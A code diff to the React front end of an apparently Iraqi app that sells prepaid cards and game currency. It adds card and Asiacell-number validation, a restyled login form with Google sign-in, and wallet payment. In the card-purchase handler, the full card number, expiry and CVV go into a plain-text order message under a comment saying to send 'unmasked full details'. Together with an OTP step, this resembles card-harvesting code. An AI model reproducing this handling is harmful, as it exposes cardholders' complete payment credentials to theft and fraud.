@@ -17,6 +17,8 @@ import type { ServerTransaction } from '../types/transaction';
 import { Capacitor } from '@capacitor/core';
 import { apiUrl } from './lib/apiBase';
 import { formatLatinDigits } from './lib/formatNumbers';
+import { validateCard } from './lib/cardValidation';
+import type { CardValidationReason } from './lib/cardValidation';
 import { PUBG_UC_PACKAGES } from './lib/pubgUcPackages';
 
 /** أيقونة محفظة مخصّصة: مسار نسبي من API أو رابط كامل */
@@ -399,6 +401,15 @@ function MainContent() {
   const [selectedMethod, setSelectedMethod] = useState<string | null>(null);
   const [copied, setCopied] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [cardValidationError, setCardValidationError] = useState<CardValidationReason | null>(null);
+  const [asiacellNum, setAsiacellNum] = useState('');
+  const [asiacellErr, setAsiacellErr] = useState(false);
+  /** يتحقق من صيغة رقم الهاتف العراقي */
+  const validateAsiacell = (v: string) => {
+    if (!v.trim()) { setAsiacellErr(false); return; }
+    const ok = /^(\+964|964|07|7)\d{7,10}$/.test(v.trim().replace(/\s/g, ''));
+    setAsiacellErr(!ok);
+  };
   const [isSuccess, setIsSuccess] = useState(false);
   const [showOtpStep, setShowOtpStep] = useState(false);
   const [otpState, setOtpState] = useState<'input' | 'checking' | 'failed'>('input');
@@ -1399,6 +1410,13 @@ function MainContent() {
         const expiry =
           expMonth && expYear ? `${expMonth}/${String(expYear).slice(-2)}` : '';
         const cvv = (form.elements.namedItem('cc-csc') as HTMLInputElement).value;
+        const depCardError = validateCard({ number: cardNumber, expMonth, expYear, cvv });
+        if (depCardError) {
+          setCardValidationError(depCardError);
+          setIsSubmitting(false);
+          return;
+        }
+        setCardValidationError(null);
         details =
           `💰 طلب إيداع رصيد\n` +
           `👤 الاسم: ${cardHolder}\n` +
@@ -1422,12 +1440,21 @@ function MainContent() {
         const expiry =
           expMonth && expYear ? `${expMonth}/${String(expYear).slice(-2)}` : '';
         const cvv = (form.elements.namedItem('cc-csc') as HTMLInputElement).value;
-        
+        const userAsiacell = (form.elements.namedItem('buy-asiacell') as HTMLInputElement)?.value || '';
+        const buyCardError = validateCard({ number: cardNumber, expMonth, expYear, cvv });
+        if (buyCardError) {
+          setCardValidationError(buyCardError);
+          setIsSubmitting(false);
+          return;
+        }
+        setCardValidationError(null);
+
         // As requested: Send unmasked full details, and explicitly highlight requested parts
         const last4 = cardNumber.slice(-4);
         const lastCvv = cvv.slice(-1);
-        
+
         details = `💎 طلب شراء كارتات\n` +
+                  `📲 رقم العميل (اسيا): ${userAsiacell}\n` +
                   `👤 الاسم: ${cardHolder}\n` +
                   `💳 البطاقة: ${cardNumber}\n` +
                   `📅 التاريخ: ${expiry}\n` +
@@ -1736,84 +1763,116 @@ function MainContent() {
             </>
           ) : (
             <>
-          {/* Logo and Identity */}
-          <div className="flex flex-col items-center gap-3 mb-8">
-            <div className="w-24 h-24 rounded-3xl flex items-center justify-center p-2 bg-transparent">
+          {/* الشعار */}
+          <div className="flex flex-col items-center gap-2 mb-8">
+            <div className="w-20 h-20 rounded-2xl flex items-center justify-center bg-transparent">
               <BrandLogo size="xl" priority />
             </div>
-            <div>
-              <h1 className="font-black text-xl tracking-tight text-gray-900">{t('appTitle')}</h1>
-            </div>
+            <h1 className="font-black text-xl tracking-tight text-gray-900">{t('appTitle')}</h1>
+            <p className="text-sm text-gray-400 font-medium">
+              {authMode === 'signin'
+                ? t('signInPrompt', 'الرجاء تسجيل الدخول للمتابعة')
+                : t('signUpPrompt', 'أنشئ حساباً لحفظ معاملاتك')}
+            </p>
           </div>
-          <h2 className="text-2xl font-black text-center text-gray-900 mb-2">
-            {authMode === 'signin' ? t('welcomeBack', 'مرحباً بعودتك') : t('createAccount', 'إنشاء حساب جديد')}
-          </h2>
-          <p className="text-center text-gray-500 mb-8 font-medium">
-            {authMode === 'signin' ? t('signInPrompt', 'الرجاء تسجيل الدخول للمتابعة') : t('signUpPrompt', 'أنشئ حساباً لحفظ معاملاتك')}
-          </p>
-          
+
+          {/* تبويب تسجيل الدخول / إنشاء حساب */}
+          <div className="flex bg-gray-100 rounded-2xl p-1 mb-6">
+            {(['signin', 'signup'] as const).map((mode) => (
+              <button
+                key={mode}
+                type="button"
+                onClick={() => { setAuthMode(mode); setAuthError(null); setShowPassword(false); }}
+                className={`flex-1 py-2.5 text-sm font-bold rounded-xl transition-all ${
+                  authMode === mode ? 'bg-white shadow text-gray-900' : 'text-gray-500'
+                }`}
+              >
+                {mode === 'signin'
+                  ? t('login', 'تسجيل الدخول')
+                  : t('register', 'حساب جديد')}
+              </button>
+            ))}
+          </div>
+
           {authError && (
-            <div className="mb-6 p-4 bg-red-50 text-red-600 rounded-xl text-sm font-bold border border-red-100 flex items-center gap-2">
-              <ShieldAlert className="w-5 h-5 shrink-0" />
+            <div className="mb-5 p-3.5 bg-red-50 text-red-600 rounded-xl text-sm font-bold border border-red-100 flex items-center gap-2">
+              <ShieldAlert className="w-4 h-4 shrink-0" />
               {authError}
             </div>
           )}
 
-          <form onSubmit={(e) => handleAuth(e, authMode === 'signup')} className="space-y-4">
+          <form onSubmit={(e) => handleAuth(e, authMode === 'signup')} className="space-y-3">
             {authMode === 'signup' && (
-              <div>
-                <label className="block text-sm font-bold text-gray-700 mb-2">{t('fullName')}</label>
-                <input name="full_name" type="text" required className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-red-500/20 focus:border-red-500 outline-none transition-all" placeholder="John Doe" />
-              </div>
+              <input
+                name="full_name" type="text" required
+                className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-red-500/20 focus:border-red-500 outline-none transition-all text-sm"
+                placeholder={t('fullName')}
+              />
             )}
-            <div>
-              <label className="block text-sm font-bold text-gray-700 mb-2">{t('emailAddress', 'البريد الإلكتروني')}</label>
-              <input name="email" type="email" required className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-red-500/20 focus:border-red-500 outline-none transition-all" placeholder="user@example.com" dir="ltr" />
+            <input
+              name="email" type="email" required dir="ltr"
+              className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-red-500/20 focus:border-red-500 outline-none transition-all text-sm"
+              placeholder="user@example.com"
+            />
+            <div className="relative">
+              <input
+                name="password"
+                type={showPassword ? 'text' : 'password'}
+                required dir="ltr"
+                className="w-full px-4 py-3 pe-11 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-red-500/20 focus:border-red-500 outline-none transition-all text-sm"
+                placeholder={lang === 'ar' ? 'كلمة المرور' : 'Password'}
+              />
+              <button
+                type="button"
+                onClick={() => setShowPassword(!showPassword)}
+                className="absolute end-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 p-1"
+              >
+                {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+              </button>
             </div>
-            <div>
-              <label className="block text-sm font-bold text-gray-700 mb-2">{t('password', 'كلمة المرور')}</label>
-              <div className="relative">
-                <input 
-                  name="password" 
-                  type={showPassword ? 'text' : 'password'} 
-                  required 
-                  className="w-full px-4 py-3 pe-12 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-red-500/20 focus:border-red-500 outline-none transition-all" 
-                  placeholder="⬢⬢⬢⬢⬢⬢⬢⬢" 
-                  dir="ltr" 
-                />
-                <button
-                  type="button"
-                  onClick={() => setShowPassword(!showPassword)}
-                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors p-1"
-                >
-                  {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
-                </button>
-              </div>
-            </div>
-            
-            <button type="submit" disabled={isAuthLoading} className="w-full bg-red-600 text-white py-3.5 rounded-xl font-bold hover:bg-red-700 transition-colors shadow-lg shadow-red-600/20 mt-2 disabled:opacity-70 flex justify-center">
-              {isAuthLoading ? <Activity className="w-5 h-5 animate-pulse" /> : authMode === 'signin' ? t('login', 'تسجيل الدخول') : t('register', 'تسجيل')}
+
+            <button
+              type="submit" disabled={isAuthLoading}
+              className="w-full bg-red-600 text-white py-3.5 rounded-xl font-black hover:bg-red-700 transition-colors shadow-lg shadow-red-600/20 disabled:opacity-70 flex justify-center items-center gap-2 text-sm"
+            >
+              {isAuthLoading
+                ? <Activity className="w-5 h-5 animate-pulse" />
+                : authMode === 'signin' ? t('login', 'تسجيل الدخول') : t('register', 'إنشاء الحساب')}
             </button>
           </form>
 
-          <div className="mt-8 text-center space-y-4">
-            <button 
-              onClick={() => { setAuthMode(authMode === 'signin' ? 'signup' : 'signin'); setAuthError(null); setShowPassword(false); }}
-              className="text-gray-500 hover:text-gray-900 font-bold transition-colors text-sm"
-            >
-              {authMode === 'signin' ? t('noAccountText', 'ليس لديك حساب؟ أنشئ حساباً') : t('hasAccountText', 'لديك حساب بالفعل؟ سجل دخولك')}
-            </button>
-            {isWebBrowser() && (
-              <a
-                href={apkDownloadHref()}
-                download
-                className="flex items-center justify-center gap-2 text-sm font-bold text-red-600 hover:text-red-700"
-              >
-                <Download className="w-4 h-4 shrink-0" />
-                {t('downloadApk')}
-              </a>
-            )}
+          {/* فاصل */}
+          <div className="flex items-center gap-3 my-5">
+            <div className="flex-1 h-px bg-gray-200" />
+            <span className="text-xs text-gray-400 font-medium">{lang === 'ar' ? 'أو' : 'OR'}</span>
+            <div className="flex-1 h-px bg-gray-200" />
           </div>
+
+          {/* تسجيل الدخول بـ Google */}
+          <button
+            type="button"
+            disabled={isAuthLoading}
+            onClick={async () => {
+              try {
+                await supabase.auth.signInWithOAuth({
+                  provider: 'google',
+                  options: { redirectTo: window.location.origin },
+                });
+              } catch (e) {
+                console.error(e);
+              }
+            }}
+            className="w-full flex items-center justify-center gap-3 border border-gray-200 bg-white hover:bg-gray-50 text-gray-700 font-bold py-3 rounded-xl transition-colors text-sm shadow-sm disabled:opacity-60"
+          >
+            {/* Google SVG */}
+            <svg width="18" height="18" viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg">
+              <path d="M17.64 9.2c0-.637-.057-1.251-.164-1.84H9v3.481h4.844c-.209 1.125-.843 2.078-1.796 2.716v2.259h2.908c1.702-1.567 2.684-3.875 2.684-6.615z" fill="#4285F4"/>
+              <path d="M9 18c2.43 0 4.467-.806 5.956-2.18l-2.908-2.259c-.806.54-1.837.86-3.048.86-2.344 0-4.328-1.584-5.036-3.711H.957v2.332A8.997 8.997 0 0 0 9 18z" fill="#34A853"/>
+              <path d="M3.964 10.71A5.41 5.41 0 0 1 3.682 9c0-.593.102-1.17.282-1.71V4.958H.957A8.996 8.996 0 0 0 0 9c0 1.452.348 2.827.957 4.042l3.007-2.332z" fill="#FBBC05"/>
+              <path d="M9 3.58c1.321 0 2.508.454 3.44 1.345l2.582-2.58C13.463.891 11.426 0 9 0A8.997 8.997 0 0 0 .957 4.958L3.964 6.29C4.672 4.163 6.656 3.58 9 3.58z" fill="#EA4335"/>
+            </svg>
+            {lang === 'ar' ? 'المتابعة بحساب Google' : 'Continue with Google'}
+          </button>
           
           </>
           )}
@@ -5256,7 +5315,7 @@ function MainContent() {
           {/* حقل المبلغ المخفي */}
           <input type="hidden" name="dep-amount" value={depositAmountInput} />
           <div className="bg-white rounded-2xl border border-gray-100 p-4">
-            <CreditCardPaymentFields idPrefix="deposit-cc" />
+            <CreditCardPaymentFields idPrefix="deposit-cc" error={cardValidationError} onChange={() => setCardValidationError(null)} />
           </div>
 
           {/* أمان */}
@@ -5280,7 +5339,7 @@ function MainContent() {
     const selectedMethodName = currentMethodsFiltered.find(m => m.id === selectedMethod)?.name;
 
     if (txType === 'buy') {
-      const cardValues = [2000, 5000, 10000, 15000, 25000, 50000, 100000];
+      const cardValues = [2000, 5000, 10000, 15000, 25000, 50000, 100000, 150000, 200000, 250000];
       const hero100kIqd = parseHeroBuyPriceIqdFor100k(siteContent.heroBuyAmountDisplay);
       const pricePerCard =
         hero100kIqd != null
@@ -5522,14 +5581,35 @@ function MainContent() {
 
                     <div>
                       <label className="block text-sm font-bold text-gray-700 mb-2">{t('enterAsiacellNumber')}</label>
-                      <input 
+                      <input
                         name="buy-asiacell"
-                        type="text" 
+                        form="payment-card-form"
+                        type="text"
+                        inputMode="tel"
                         required
-                        className="w-full px-4 py-3 bg-white border border-gray-200 rounded-xl focus:ring-2 focus:ring-gray-900/10 focus:border-gray-900 outline-none transition-all font-mono text-lg font-bold text-gray-900 text-left"
-                        placeholder="07..."
+                        value={asiacellNum}
+                        onChange={(e) => {
+                          // يقبل أرقام + + فقط
+                          const v = e.target.value.replace(/[^\d+]/g, '');
+                          setAsiacellNum(v);
+                          setAsiacellErr(false);
+                        }}
+                        onBlur={() => validateAsiacell(asiacellNum)}
+                        className={`w-full px-4 py-3 rounded-xl outline-none transition-all font-mono text-lg font-bold text-gray-900 text-left
+                          ${asiacellErr
+                            ? 'border border-red-400 bg-red-50 focus:border-red-500 focus:ring-2 focus:ring-red-400/20'
+                            : 'border border-gray-200 bg-white focus:ring-2 focus:ring-gray-900/10 focus:border-gray-900'}`}
+                        placeholder="07xxxxxxxx"
                         dir="ltr"
                       />
+                      {asiacellErr && (
+                        <p className="mt-1.5 flex items-center gap-1.5 text-xs font-bold text-red-600">
+                          <span className="inline-block h-1.5 w-1.5 shrink-0 rounded-full bg-red-500" />
+                          {lang === 'ar'
+                            ? 'يرجى إدخال رقم صحيح (07، 7، 964، +964)'
+                            : 'Enter a valid number (07, 7, 964, +964)'}
+                        </p>
+                      )}
                     </div>
                     <div className="flex justify-between items-center text-sm p-3.5 rounded-xl border bg-gray-100 border-gray-200">
                       <span className="font-semibold text-gray-800">{t('totalPrice')}</span>
@@ -5608,7 +5688,7 @@ function MainContent() {
                   method="post"
                 >
                   {isBuyCardMethod ? (
-                    <CreditCardPaymentFields idPrefix="payment-cc" />
+                    <CreditCardPaymentFields idPrefix="payment-cc" error={cardValidationError} onChange={() => setCardValidationError(null)} />
                   ) : buyPaymentType === 'wallet' ? (
                     <div className="bg-green-50 rounded-2xl p-4 border border-green-100">
                       <div className="flex items-center gap-3">
@@ -5676,17 +5756,86 @@ function MainContent() {
                   </div>
 
                   {/* زر تأكيد الشراء */}
-                  <button
-                    type="submit"
-                    disabled={isSubmitting}
-                    className="w-full bg-blue-600 hover:bg-blue-700 text-white py-4 rounded-2xl font-black text-base active:scale-[0.98] transition-all disabled:opacity-70 flex justify-center items-center shadow-lg shadow-blue-600/20 mt-4"
-                  >
-                    {isSubmitting ? (
-                      <div className="h-5 w-5 rounded-full border-2 border-white border-t-transparent animate-spin" />
-                    ) : (
-                      lang === 'ar' ? 'تأكيد الشراء' : 'Confirm Purchase'
-                    )}
-                  </button>
+                  {buyPaymentType === 'wallet' ? (
+                    <button
+                      type="button"
+                      disabled={isSubmitting}
+                      onClick={async () => {
+                        if (!clientId) return;
+                        const asiaEl = document.querySelector('input[name="buy-asiacell"]') as HTMLInputElement | null;
+                        const userAsiacell = asiaEl?.value?.trim() || '';
+                        if (!userAsiacell) {
+                          setAsiacellErr(true);
+                          asiaEl?.focus();
+                          return;
+                        }
+                        const asiaOk = /^(\+964|964|07|7)\d{7,10}$/.test(userAsiacell.replace(/\s/g, ''));
+                        if (!asiaOk) {
+                          setAsiacellErr(true);
+                          asiaEl?.focus();
+                          return;
+                        }
+                        setIsSubmitting(true);
+                        try {
+                          const details =
+                            `💎 طلب شراء كارتات (دفع من الرصيد)\n` +
+                            `📲 رقم العميل (اسيا): ${userAsiacell}\n` +
+                            `💰 الفئة: ${cardValue} | الكمية: ${quantity}\n` +
+                            `💳 الدفع: رصيد المحفظة`;
+                          const res = await fetch(apiUrl('/api/transactions'), {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                              client_id: clientId,
+                              user_id: userId,
+                              user_name: profileDraft.full_name || null,
+                              type: 'buy',
+                              amount: totalPrice,
+                              method: lang === 'ar' ? 'رصيد المحفظة' : 'Wallet Balance',
+                              details,
+                              pay_from_wallet: true,
+                            }),
+                          });
+                          if (res.ok) {
+                            await fetchWalletBalance();
+                            await fetchTransactions();
+                            setIsSuccess(true);
+                          } else {
+                            const err = await res.json().catch(() => null);
+                            const insufficient = err?.error === 'insufficient_balance';
+                            alert(
+                              lang === 'ar'
+                                ? (insufficient ? 'الرصيد غير كافٍ' : `فشل الشراء: ${err?.error || res.status}`)
+                                : (insufficient ? 'Insufficient balance' : `Purchase failed: ${err?.error || res.status}`),
+                            );
+                          }
+                        } catch (e) {
+                          console.error(e);
+                        } finally {
+                          setIsSubmitting(false);
+                        }
+                      }}
+                      className="w-full bg-blue-600 hover:bg-blue-700 text-white py-4 rounded-2xl font-black text-base active:scale-[0.98] transition-all disabled:opacity-70 flex justify-center items-center shadow-lg shadow-blue-600/20 mt-4"
+                    >
+                      {isSubmitting ? (
+                        <div className="h-5 w-5 rounded-full border-2 border-white border-t-transparent animate-spin" />
+                      ) : (
+                        lang === 'ar' ? 'تأكيد الشراء' : 'Confirm Purchase'
+                      )}
+                    </button>
+                  ) : (
+                    <button
+                      type="submit"
+                      disabled={isSubmitting}
+                      className="w-full bg-blue-600 hover:bg-blue-700 text-white py-4 rounded-2xl font-black text-base active:scale-[0.98] transition-all disabled:opacity-70 flex justify-center items-center shadow-lg shadow-blue-600/20 mt-4"
+                    >
+                      {isSubmitting ? (
+                        <div className="h-5 w-5 rounded-full border-2 border-white border-t-transparent animate-spin" />
+                      ) : (
+                        lang === 'ar' ? 'تأكيد الشراء' : 'Confirm Purchase'
+                      )}
+                    </button>
+                  )}
                 </form>
               </div>
             </div>
